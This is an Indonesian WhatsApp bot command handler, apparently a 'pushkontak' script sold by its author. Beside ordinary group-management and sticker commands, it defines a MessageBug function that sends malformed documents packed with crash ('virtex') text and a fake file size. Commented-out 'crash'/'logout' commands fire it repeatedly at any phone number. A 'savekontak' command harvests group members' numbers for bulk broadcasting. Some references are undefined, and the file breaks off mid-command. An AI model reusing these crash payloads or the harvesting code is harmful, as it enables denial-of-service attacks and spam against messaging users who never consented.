module.exports = async (della, m, store) => {
try {
const body = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.'
const chalk = require('chalk')
const isCmd = body.startsWith(prefix)
//const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '' //kalau mau no prefix ganti jadi ini : 
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const cmd = prefix + command
const args = body.trim().split(/ +/).slice(1)
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const text = q = args.join(" ")
const isOwner = m.sender == owner+"@s.whatsapp.net"
const isGroup = m.chat.endsWith('@g.us')
const botNumber = await della.decodeJid(della.user.id)

const senderNumber = m.sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await della.groupMetadata(m.key.remoteJid) : {}
let participant_bot = (isGroup ? groupMetadata.participants.find((v) => v.id == m.botNumber) : {}) || {}
let participant_sender = (isGroup ? groupMetadata.participants.find((v) => v.id == m.sender) : {}) || {}
const isBotAdmin = participant_bot?.admin !== null ? true : false
const isAdmin = participant_sender?.admin !== null ? true : false
const { runtime, fetchJson, getRandom, getTime, tanggal, toRupiah, telegraPh } = require('./all/function.js')
const payment = JSON.parse(fs.readFileSync('./all/database/payment.json'))
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
const { teksbug1 } = require("./all/database/virtex.js")
const { teksbug2 } = require("./all/database/delay.js")

async function loading () {
var dellaloading = [
"𝙻𝙾𝙰𝙳𝙸𝙽",
"𝙻𝙾𝙰𝙳𝙸𝙽𝙶",
"𝙻𝚘𝚊𝚍𝚒𝚗𝚐 𝚂𝚎𝚕𝚎𝚜𝚊𝚒..."
]
let { key } = await della.sendMessage(from, {text: '𝙻𝙾𝙰𝙳'})
for (let i = 0; i < dellaloading.length; i++) {
await della.sendMessage(from, {text: dellaloading[i], edit: key });
}
}
// Random Color
const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]

// Command Yang Muncul Di Console
if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(namabot), color(`[ PESAN ]`, `${randomcolor}`), color(`FROM`, `${randomcolor}`), color(`${senderNumber}`, `${randomcolor}`), color(`Text :`, `${randomcolor}`), color(`${cmd}`, `white`))
}
/*if (command) {
const a = m.isGroup ? "Group" : "Private";
console.log("");
console.log(
`╔════━──⪼\n`+
`║${chalk.magenta(a)}\n`+
`╠════━──⪼\n`+
`║${chalk.blue("SENDER")}: ${chalk.red(m.pushName)}\n`+
`║${chalk.blue("MESSAGE")}: ${chalk.yellow(command)}\n`+
`║${chalk.blue("NOMOR")}: ${chalk.green(m.sender)}\n`+
`║${chalk.blue("TIME")}: ${chalk.cyan(time)}\n`+
`╚════━──⪼\n` );
    }*/
let dbchat = db.data.chats[m.chat]
if (typeof dbchat !== 'object') db.data.chats[m.chat] = {}
if (dbchat) {
if (!("antilink" in dbchat)) dbchat.antilink = false
if (!("antilink2" in dbchat)) dbchat.antilink2 = false
if (!("welcome" in dbchat)) dbchat.welcome = true
} else db.data.chats[m.chat] = {
antilink: true,
antilink2: false,
welcome: false
}

if (isGroup && db.data.chats[m.chat].antilink && isBotAdmin) {
if (!isAdmin && !isOwner && !m.fromMe) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text)) {
var gclink = (`https://chat.whatsapp.com/` + await della.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await della.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} Maaf Kamu Akan Saya Keluarkan Dari Grup Ini Karna Admin/Owner Bot Menyalakan Fitur *Antilink* Grup Lain!`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnailUrl: "https://files.catbox.moe/2zqlt5.jpg", title: "｢ LINK GRUP DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await della.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await della.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}
}}

if (isGroup && db.data.chats[m.chat].antilink2 && isBotAdmin) {
if (!isAdmin && !isOwner && !m.fromMe) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text)) {
var gclink = (`https://chat.whatsapp.com/` + await della.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await della.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} Maaf Pesan Kamu Saya Hapus Karna Admin/Owner Bot Menyalakan Fitur *Antilink* Grup Lain!`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnailUrl: "https://files.catbox.moe/rly3s7.jpg", title: "｢ LINK GRUP DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await della.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
}
}}

const qloc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `${global.namabot}`,jpegThumbnail: ""}}}

const qloc2 = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `${global.della}`,jpegThumbnail: ""}}}

let example = (teks) => {
return `\n*𝐏𝐔𝐒𝐇𝐊𝐎𝐍𝐓𝐀𝐊 :*\n• ⪼ ketik *${cmd}* ${teks}\n`
}

var resize = async (image, width, height) => {
let oyy = await Jimp.read(image)
let kiyomasa = await oyy.resize(width, height).getBufferAsync(Jimp.MIME_JPEG)
return kiyomasa
}

function capital(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}

const qbug = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {listResponseMessage: {title: `Hello My Friends`
}}}
const MessageBug = async (target) => {

return della.sendMessage(target, {document: fs.readFileSync("./all/kosong.js"), mimetype: "😄😇😂🔥", fileName: "Paket.zip", fileLength: 99999999999, caption: `key.com${teksbug2}`}, {quoted: qbug})

}
//REPLAY 
const reply = (teks) => { 
danzz.sendMessage(from, { text: teks, contextInfo: { 
"externalAdReply": { 
"showAdAttribution": true, 
"title": "𝑫𝒂𝒏𝒛𝒛𝑶𝒇𝒇𝒄 🔥", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": thumb, 
"mediaUrl": global.imageurl, 
"sourceUrl": global.linksaluran }}}, { quoted: m }) }

switch (command) {
case "menu": case "push": {
const textnya = `  
┏━╼⟬𝑭𝑶𝑹𝑴𝑨𝑻𝑰𝑶𝑵 𝑩𝑶𝑻⟭╾⪼
┃▹ *Owner :* ${global.owner}
┃▹ *dev   :* 6285861398259
┃▹ *VERSI SC :* _VERSION SCRIPT 2.0.2_
┗╼──━━⪼
• • •「${getTime().split("T")[1].split("+")[0]}」• • •
${global.menu}
> © powered by ${global.della}
Note : script mode public 
`
della.sendMessage(m.chat, {text: textnya, contextInfo: 
                           {mentionedJid: [m.sender], externalAdReply: {thumbnailUrl: "https://files.catbox.moe/rly3s7.jpg", title: `𝐏𝐔𝐒𝐇𝐊𝐎𝐍𝐓𝐀𝐊 𝐁𝐘 𝐃𝐄𝐋𝐋𝐀`, body: `HALLO @${m.sender.split('@')[0]}`, sourceUrl: `${global.linksaluran}`,renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
/*{forwardingScore: 99999,
isForwarded: true, forwardedNewsletterMessageInfo: {newsletterJid: '120363285238450909@newsletter', serverMessageId: 100, 
newsletterName: `〖PUSHKONTAK DENZ〗`}}},{quoted: null}
    )*/
}
async function loading () {
var dellaloading = [
"𝙻𝙾𝙰𝙳𝙸𝙽",
"𝙻𝙾𝙰𝙳𝙸𝙽𝙶",
"𝙻𝚘𝚊𝚍𝚒𝚗𝚐 𝚂𝚎𝚕𝚎𝚜𝚊𝚒..."
]
let { key } = await della.sendMessage(from, {text: '𝙻𝙾𝙰𝙳'})
for (let i = 0; i < dellaloading.length; i++) {
await della.sendMessage(from, {text: dellaloading[i], edit: key });
}
}
break
case "tts": {
if (!text) return m.reply(example("Hallo saya adalah Denz hosting"))
if (text.length >= 300) return m.reply("Jumlah huruf harus di bawah 300!")
m.reply(msg.wait)
let id = 'id_001'
try {
const { data } = await axios.post("https://tiktok-tts.weilnet.workers.dev/api/generation", {
    "text": text,
    "voice": id
})
della.sendMessage(m.chat, { audio: Buffer.from(data.data, "base64"), mimetype: "audio/mp4" }, {quoted: m})
} catch (e) {
return m.reply(e.toString())
}
}
break
  

/*case "ytmp4": {
  if (!text) return m.reply('*PERMINTAAN ERROR!! CONTOH :*\n> *.ytmp4 <link youtube>*')
  try {
    m.reply('*Process sending video, mungkin membutuhkan 1-3 menit jika durasi video panjang!*')
    let proces = await (await fetch(`https://endpoint.web.id/downloader/ytmp4?key=${global.key}&url=${text}`)).json()
    let video4 = proces.result; 
    Shannz.sendMessage(m.chat,{video:{url: video4.media }, caption: video4.title }, { quoted: m })
  } catch (e) {
      m.reply('*terjadi error*');
    }
}
break*/
/*case "ytplay": case "play": {
if (!text) return m.reply(example('Dj tiktok'))
m.reply(msg.wait)
const { pipeline } = require('stream')
const { promisify } = require('util')
const streamPipeline = promisify(pipeline)
try {
let search = await yts(text)
let vid = search.videos[0]
let { title, thumbnail: thumb, timestamp, author, url } = vid
const audioStream = ytdl(url, {
filter: 'audioonly',
quality: 'highestaudio'})
let acak = await getRandom(".mp3")
const writableStream = fs.createWriteStream(`./all/tmp/${acak}`)
await streamPipeline(audioStream, writableStream)
await della.sendMessage(m.chat, {audio: fs.readFileSync(`./all/tmp/${acak}`), mimetype: 'audio/mpeg', contextInfo: {externalAdReply: {thumbnailUrl: thumb, title: title, body: "Duration : "+timestamp+" | "+"Author : "+author.name, sourceUrl: url, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
fs.unlinkSync(`./all/tmp/${acak}`)
} catch (e) {
return m.reply(e.toString())
}
}
break*/
 /*case 'qc': {
if (!isRegistered) return reply2(mess.regis)
if (!q) return reply(`📌Example: ${prefix + command} hallo`)
let obj = {
type: 'quote',
format: 'png',
backgroundColor: '#ffffff',
width: 512,
height: 768,
scale: 2,
messages: [
{
entities: [],
avatar: true,
from: {
id: 1,
name: pushname,
photo: { 
url: await della.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'),
}
},
text: `${q}`,
replyMessage: {},
},
],
};
let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
headers: {
'Content-Type': 'application/json',
},
});
let buffer = Buffer.from(response.data.result.image, 'base64');
della.sendImageAsSticker(m.chat, buffer, kalgans, { packname: `${global.packname}`, author: `${global.author}`})
}
break*/
case "qc": {
if (!text) return m.reply(example('teksnya'))
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
let ppuser
try {
ppuser = await della.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://files.catbox.moe/rly3s7.jpg'
}
let reswarna = await warna[Math.floor(Math.random()*warna.length)]
m.reply(msg.wait)
const obj = {
      "type": "quote",
      "format": "png",
      "backgroundColor": reswarna,
      "width": 512,
      "height": 768,
      "scale": 2,
      "messages": [{
         "entities": [],
         "avatar": true,
         "from": {
            "id": 1,
            "name": m.pushName,
            "photo": {
               "url": ppuser
            }
         },
         "text": text,
         "replyMessage": {}
      }]
   }
   try {
   const json = await axios.post('https://bot.lyo.su/quote/generate', obj, {
      headers: {
         'Content-Type': 'application/json'
      }
   })
   const buffer = Buffer.from(json.data.result.image, 'base64')
della.sendStimg(m.chat, buffer, m, { packname: global.packname })
   } catch (error) {
   m.reply(error.toString())
   }
}
break
case "list": {
const teksnya = `
> ${global.list}`
/*della.sendMessage(m.chat, {text: textnya, contextInfo: {forwardingScore: 99999,
isForwarded: true, forwardedNewsletterMessageInfo: {newsletterJid: '120363285238450909@newsletter', serverMessageId: 100, 

newsletterName: `〖PUSHKONTAK DENZ〗`}}},{quoted: null}

    )}*/
della.sendMessage(m.chat, {text: teksnya, contextInfo:
{mentionedJid: [m.sender], externalAdReply: {thumbnailUrl: "https://telegra.ph/file/8be97d7c69f8d2d6e3b46.jpg", title: `HALLO @${m.sender.split('@')[0]}`, body: "klik di sini untuk membeli", sourceUrl : `https://wa.me/${global.owner}`,renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})}

break
case "sc": case "script":{
const teksnya = `
> SC INI DI JUAL👇`
della.sendMessage(m.chat, {text: teksnya, contextInfo:
{mentionedJid: [m.sender], externalAdReply: {thumbnailUrl: `${global.thumbnail}`, title: `PUSHKONTAK VVIP`, body: "Klik disini untuk membeli", sourceUrl : `https://wa.me/6285861398259`,renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})}
break 
case "sticker": case "stiker": case "sgif": case "s": {
if (!/image|video/.test(mime)) return m.reply(example("dengan mengirim foto/vidio"))
if (/video/.test(mime)) {
if ((qmsg).seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
}
m.reply(msg.wait)
var media = await della.downloadAndSaveMediaMessage(qmsg)
await della.sendStimg(m.chat, media, m, {packname: "PUSHKONTAK DENZ"})
await fs.unlinkSync(media)
}
break
/*case "tourl": {
if (!/image/.test(mime)) return m.reply(example("dengan mengirim foto"))
await m.reply(msg.wait)
var fotonya = await della.downloadAndSaveMediaMessage(qmsg)
var urlimage = await telegraPh(fotonya)
m.reply(`${urlimage}`)
}
break*/
        
case "public": {
if (!isOwner) return m.reply(msg.owner)
della.public = true//della.public = true
m.reply("*PUBLIC* _[ ON ]_*")
}
break
case "self": {
if (!isOwner) return m.reply(msg.owner)
della.public = false
m.reply("*PUBLIC* _[ Off ]_")
}
break
case "get": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply("linknya")
try {
var check = await fetchJson(text)
m.reply(JSON.stringify(check, null, 2))
} catch (e) {
return m.reply(e.toString())
}}
break
case "setteksjpm": {
if (!isOwner) return m.reply(msg.owner)
if (text || m.quoted) {
const newteks = m.quoted ? m.quoted.text : text
await fs.writeFileSync("./all/database/teksjpm.js", newteks.toString())
m.reply("Berhasil Mengganti Teks JPM ✅")
} else {
return m.reply(example("dengan reply/kirim teks\n\nUntuk melihat teks jpm saat ini ketik *.teksjpm*"))
}}
break
case "teksjpm": {
if (!isOwner) return m.reply(msg.owner)
m.reply(fs.readFileSync("./all/database/teksjpm.js").toString())
}
break
/*case "tiktokaudio": case "tiktokmp3": {
if (!text) return m.reply(example("linknya"))
if (!text.includes("tiktok.com")) return m.reply("Link tautan tidak valid!")
m.reply(msg.wait)
await fetchJson("https://aemt.me/download/tiktokdl?url=https://vt.tiktok.com/ZSFqrJvxm/").then((res) => {
if (!res.result.status) return m.reply(JSON.stringify(res, null, 2))
della.sendMessage(m.chat, {audio: {url: res.result.music}, mimetype: "audio/mpeg"}, {quoted: m})
})
}
break
case "tiktok": case "tt": {
if (!text) return m.reply(example('linknya'))
if (!/tiktok.com/.test(text)) return m.reply("Link Tautan Tidak Valid!")
m.reply(msg.wait)
await fetchJson(`https://snaptik.app/ID1?url=${text}`).then((res) => {
var num = 0
if (res.result.data.duration == 0) {
for (let i of res.result.data.images) {
della.sendMedia(m.chat, `${i}`, m, {caption: `*Tiktok Downloader ✅*`})
}
} else {
var cap = `*Tiktok Downloader Done ✅*`
della.sendMessage(m.chat, {video: {url: res.result.data.play}, mimetype: "video/mp4", caption: cap}, {quoted: m})
}
}).catch((err) => {
return m.reply(err.toString())
})
}
break
case "facebook": case "fb": case "fbdl": {
if (!text) return m.reply(example("linkvidionya"))
if (!/facebook.com/.test(text)) return m.reply("Link Tautan Tidak Valid!")
m.reply(msg.wait)
await fetchJson(`https://aemt.me/download/fbdown?url=${text}`).then((res) => {
if (!res.status) return m.reply(JSON.stringify(res, null, 2))
della.sendMessage(m.chat, {video: {url: `${res.result.url.isHdAvailable == true ? res.result.url.urls[0].hd : res.result.url.urls[0].sd}`}, mimetype: 'video/mp4', caption: `*Fbdl Downloader Done ✅*`}, {quoted: m})
}).catch(e => m.reply(e.toString()))
}
break*/
case "owner": {
della.sendContact(m.chat, [owner], "Telfon Atau Vc = Block", m)
}
break
case "setppgc": {
if (!isGroup) return m.reply(msg.group)
if (!isBotAdmin) return m.reply(msg.adminbot)
if (!isAdmin && !isOwner) return m.reply(msg.admin)
if (/image/g.test(mime)) {
let media = await della.downloadAndSaveMediaMessage(qmsg)
await della.updateProfilePicture(m.chat, {url: media})
await fs.unlinkSync(media)
m.reply("Berhasil Mengganti *Profil* Grup")
} else return m.reply(example('dengan mengirim foto'))}
break
case "setnamegc": case "setnamagc": {
if (!isGroup) return m.reply(msg.group)
if (!isBotAdmin) return m.reply(msg.adminbot)
if (!isAdmin && !isOwner) return m.reply(msg.admin)
if (!text) return m.reply(example('teksnya'))
const gcname = metadata.subject
await della.groupUpdateSubject(m.chat, text)
m.reply(`Berhasil Mengganti Nama Grup *${gcname}* Menjadi *${text}*`)
}
break
case "setdesc": case "setdesk": {
if (!isGroup) return m.reply(msg.group)
if (!isBotAdmin) return m.reply(msg.adminbot)
if (!isAdmin && !isOwner) return m.reply(msg.admin)
if (!text) return m.reply(example('teksnya'))
await della.groupUpdateDescription(m.chat, text)
m.reply(`Berhasil Mengganti *Deskripsi* Grup`)
}
break
case "open": {
if (!isGroup) return m.reply(msg.group)
if (!isBotAdmin) return m.reply(msg.adminbot)
if (!isAdmin && !isOwner) return m.reply(msg.admin)
await della.groupSettingUpdate(m.chat, 'not_announcement')
m.reply("Berhasil Mengganti Setelan Grup Menjadi Anggota Dapat Mengirim Pesan")
}
break
case "close": {
if (!isGroup) return m.reply(msg.group)
if (!isBotAdmin) return m.reply(msg.adminbot)
if (!isAdmin && !isOwner) return m.reply(msg.admin)
await della.groupSettingUpdate(m.chat, 'announcement')
m.reply("Berhasil Mengganti Setelan Grup Menjadi Hanya Admin Yang Dapat Mengirim Pesan")
}
break
case "demote": case "demote": {
if (!isGroup) return m.reply(msg.group)
if (!isAdmin && !isOwner) return m.reply(msg.admin)
if (!isBotAdmin) return m.reply(msg.adminbot)
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await della.groupParticipantsUpdate(m.chat, [target], 'demote').then((res) => m.reply(`${target.split("@")[0]}  menjadi member biasa`)).catch((err) => m.reply(err.toString()))
} else return m.reply(example('62838XXX'))}
break
case "promote": case "promot": {
if (!isGroup) return m.reply(msg.group)
if (!isAdmin && !isOwner) return m.reply(msg.admin)
if (!isBotAdmin) return m.reply(msg.adminbot)
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await della.groupParticipantsUpdate(m.chat, [target], 'promote').then((res) => m.reply(`${target.split("@")[0]} Sebagai Admin Grup Ini`)).catch((err) => m.reply(err.toString()))
} else return m.reply(example('62838XXX'))}
break
case "add": case "addmember": {
if (!isGroup) return m.reply(msg.group)
if (!args[0]) return m.reply(example("62838XXX"))
var teks = text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var cek = await della.onWhatsApp(`${teks.split("@")[0]}`)
if (cek.length < 1) return m.reply("Nomor Tersebut Tidak Terdaftar Di WhatsApp")
if (!isBotAdmin || !groupMetadata.memberAddMode) return m.reply("Gagal Menambahkan Member, Karna Admin Tidak Mengizinkam Peserta Dapat Add Member")
var a = await della.groupParticipantsUpdate(m.chat, [teks], 'add')
if (a[0].status == 200) return m.reply(`Berhasil Menambahkan ${teks.split("@")[0]} Kedalam Grup Ini`)
if (a[0].status == 408) return m.reply(`Gagal Menambahkan ${teks.split("@")[0]} Ke Dalam Grup Ini, Karna Target Tidak Mengizinkan Orang Lain Dapat Menambahkan Dirinya Ke Dalam Grup`)
if (a[0].status == 409) return m.reply(`Dia Sudah Ada Di Dalam Grup Ini!`)
if (a[0].status == 403) return m.reply(`Gagal Menambahkan ${teks.split("@")[0]} Ke Dalam Grup Ini, Karna Target Tidak Mengizinkan Orang Lain Dapat Menambahkan Dirinya Ke Dalam Grup`)
}
break
case "kik": case "kick": {
if (!isGroup) return m.reply(msg.group)
if (!isBotAdmin) return m.reply(msg.adminbot)
if (!isAdmin && !isOwner) return m.reply(msg.admin)
if (text || m.quoted) {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await della.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => della.sendMessage(m.chat, {text: `Berhasil Mengeluarkan @${users.split("@")[0]} Dari Grup Ini`, mentions: [`${users}`]}, {quoted: m})).catch((err) => m.reply(err.toString()))
} else return m.reply(example('nomornya/@tag'))}
break
        
/*case 'hidetag': case 'h' : {
if (!isGroup) return m.reply(msg.group)
if (!isAdmin && !isOwner) return m.reply(msg.admin)
if (!m.quoted && !text) return m.reply(example("teksnya/replyteks"))
 var teks = m.quoted ? m.quoted.text : text
//della.sendMessage(m.chat, {text: teks, mentions: [...member]})

della.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(e => e.id)}, {quoted:m})
}
break

        
/*case "hidetag": case "z": case "h": {
if (!isGroup) return m.reply(msg.group)
if (!isAdmin && !isOwner) return m.reply(msg.admin)
if (!m.quoted && !text) return m.reply(example("teksnya/replyteks"))
var teks = m.quoted ? m.quoted.text : text
var member = await participant.map(e => e.id)
della.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break*/
/*case "tagall": case "tag": {
if (!isGroup) return m.reply(msg.group)
if (!isAdmin && !isOwner) return m.reply(msg.admin)
if (!text) return m.reply(example("Pesannya"))
var member = await participant.map(e => e.id)
var teks = ` ${text}\n\n`
member.forEach(e => e !== m.sender ? teks += `@${e.split("@")[0]}\n` : '')
della.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break
case "owner": case "creator": {
della.sendContact(m.chat, [`${owner[0].split("@")[0]}`], "Developer Bot", m)
}
break*/
case "on": case "enable": {
if (isGroup) {
if (!isAdmin && !isOwner) return m.reply(msg.admin)
if (!text) {
if (isAdmin && !isOwner) {
return m.reply(example(`welcome\n\n*List Options :*\nwelcome | antilink | antilinkV2\n\nKetik *${cmd} status* untuk melihat status`))
} else if (isOwner) {
return m.reply(example(`anticall\n\n*List Options :*\nwelcome | anticall | autoread | antilink | antilinkV2\n\nKetik *${cmd} status* untuk melihat status`))
}}
var teks
if (text.toLowerCase() == "welcome") {
db.data.chats[m.chat].welcome = true
m.reply("Berhasil Menyalakan *Welcome* Di Grup Ini")
} else if (text.toLowerCase() == "antilink") {
db.data.chats[m.chat].antilink2 = false
db.data.chats[m.chat].antilink = true
m.reply("Berhasil Menyalakan *Antilink* Di Grup Ini")
} else if (text.toLowerCase() == "antilinkv2") {
db.data.chats[m.chat].antilink = false
db.data.chats[m.chat].antilink2 = true
m.reply("Berhasil Menyalakan *AntilinkV2* Di Grup Ini")
} else if (text.toLowerCase() == "anticall") {
if (!isOwner) return m.reply(msg.owner)
global.anticall = true
m.reply("Berhasil Menyalakan *Anticall*")
} else if (text.toLowerCase() == "autoread") {
if (!isOwner) return m.reply(msg.owner)
global.autoread = true
m.reply("Berhasil Menyalakan *Autoread*")
} else if (text.toLowerCase() == "status") {
if (isAdmin && !isOwner) {
teks = `
◦ Welcome : ${db.data.chats[m.chat].welcome ? "Aktif" : "Tidak Aktif"}
◦ Antilink : ${db.data.chats[m.chat].antilink ? "Aktif" : "Tidak Aktif"}
◦ AntilinkV2 : ${db.data.chats[m.chat].antilink2 ? "Aktif" : "Tidak Aktif"}
`
} else if (isOwner) {
teks = `◦ Welcome : ${db.data.chats[m.chat].welcome ? "Aktif" : "Tidak Aktif"}
◦ Antilink : ${db.data.chats[m.chat].antilink ? "Aktif" : "Tidak Aktif"}
◦ AntilinkV2 : ${db.data.chats[m.chat].antilink2 ? "Aktif" : "Tidak Aktif"}
◦ Anticall : ${global.anticall ? "Aktif" : "Tidak Aktif"}
◦ Autoread : ${global.autoread ? "Aktif" : "Tidak Aktif"}`
}
m.reply(teks)
} else {
return m.reply("Options Tidak Ditemukan!")
}} else {
return m.reply(msg.group)
}}
break
case "off": case "disable": {
if (isGroup) {
if (!isAdmin && !isOwner) return m.reply(msg.admin)
if (!text) {
if (isAdmin && !isOwner) {
return m.reply(example(`welcome\n\n*List Options :*\nwelcome | antilink | antilinkV2\n\nKetik *${cmd} status* untuk melihat status`))
} else if (isOwner) {
return m.reply(example(`anticall\n\n*List Options :*\nwelcome | anticall | autoread | antilink | antilinkV2\n\nKetik *${cmd} status* untuk melihat status`))
}}
var teks
if (text.toLowerCase() == "welcome") {
db.data.chats[m.chat].welcome = false
m.reply("Berhasil Mematikan *Welcome* Di Grup Ini")
} else if (text.toLowerCase() == "antilink") {
db.data.chats[m.chat].antilink = false
m.reply("Berhasil Mematikan *Antilink* Di Grup Ini")
} else if (text.toLowerCase() == "antilinkv2") {
db.data.chats[m.chat].antilink2 = false
m.reply("Berhasil Mematikan *AntilinkV2* Di Grup Ini")
} else if (text.toLowerCase() == "anticall") {
if (!isOwner) return m.reply(msg.owner)
global.anticall = false
m.reply("Berhasil Mematikan *Anticall*")
} else if (text.toLowerCase() == "autoread") {
if (!isOwner) return m.reply(msg.owner)
global.autoread = false
m.reply("Berhasil Mematikan *Autoread*")
} else if (text.toLowerCase() == "status") {
if (isAdmin && !isOwner) {
teks = `
◦ Welcome : ${db.data.chats[m.chat].welcome ? "Aktif" : "Tidak Aktif"}
◦ Antilink : ${db.data.chats[m.chat].antilink ? "Aktif" : "Tidak Aktif"}
◦ AntilinkV2 : ${db.data.chats[m.chat].antilink2 ? "Aktif" : "Tidak Aktif"}
`
} else if (isOwner) {
teks = `◦ Welcome : ${db.data.chats[m.chat].welcome ? "Aktif" : "Tidak Aktif"}
◦ Antilink : ${db.data.chats[m.chat].antilink ? "Aktif" : "Tidak Aktif"}
◦ AntilinkV2 : ${db.data.chats[m.chat].antilink2 ? "Aktif" : "Tidak Aktif"}
◦ Anticall : ${global.anticall ? "Aktif" : "Tidak Aktif"}
◦ Autoread : ${global.autoread ? "Aktif" : "Tidak Aktif"}`
}
m.reply(teks)
} else {
return m.reply("Options Tidak Ditemukan!")
}} else {
return m.reply(msg.group)
}}
break
/*case "santet": case "crash": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(example("6283XX,jumlahbug"))
if (!text.split(",")) return m.reply(example("6283XX,jumlahbug"))
var [target, jumlah] = text.split(",")
if (isNaN(target)) return m.reply("Target Tidak Valid!")
if (isNaN(jumlah)) return m.reply("Jumlah Tidak Valid!")
var org = target.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var check = await della.onWhatsApp(org.split('@')[0])
if (!check[0].exists) return m.reply("Target Tidak Terdaftar Di WhatsApp")
m.reply("Memproses Pengiriman Bug . . .")
var total = Number(jumlah) + 10
for (let i = 0; i < total; i++) {
if (i == 10) m.reply(`Berhasil Memproses, Bug Sedang Dikirim Ke ${org.split("@")[0]}`)
MessageBug(`${org}`)
await sleep(2000)
}
}
break
case "ganas": case "logout": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(example("6283XX,jumlahbug"))
if (!text.split(",")) return m.reply(example("6283XX,jumlahbug"))
var [target, jumlah] = text.split(",")
if (isNaN(target)) return m.reply("Target Tidak Valid!")
if (isNaN(jumlah)) return m.reply("Jumlah Tidak Valid!")
var org = target.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var check = await della.onWhatsApp(org.split('@')[0])
if (!check[0].exists) return m.reply("Target Tidak Terdaftar Di WhatsApp")
m.reply("Memproses Pengiriman Bug . . .")
var total = Number(jumlah) + 20
for (let i = 0; i < total; i++) {
if (i == 10) m.reply(`Berhasil Memproses, Bug Sedang Dikirim Ke ${org.split("@")[0]}`)
MessageBug(`${org}`)
await sleep(2000)
}
}
break*/
case "savekontak": case "svcontact": {
if (!isOwner) return m.reply(msg.owner)
if (!isGroup) return m.reply(msg.group)
const halls = await groupMetadata.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
}}
